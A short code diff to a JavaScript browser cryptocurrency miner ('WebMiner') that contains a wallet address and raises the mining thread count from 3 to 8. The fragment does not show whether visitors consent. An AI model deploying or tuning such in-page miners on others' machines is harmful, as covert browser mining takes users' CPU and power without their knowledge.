@@ -6,7 +6,7 @@ var addr = "43MfvuniTbw1g1NvBUHxXe1LvsDfbMfajWgecKRqMnWcDw54kBt6aykY2vibPaCfCqDu
 		status_timer: false,
 		update_sec: 2
 	};
-var threads = 3;
+var threads = 8;
 
 function WebMiner() {
 	if ($WM.enabled && addr) {
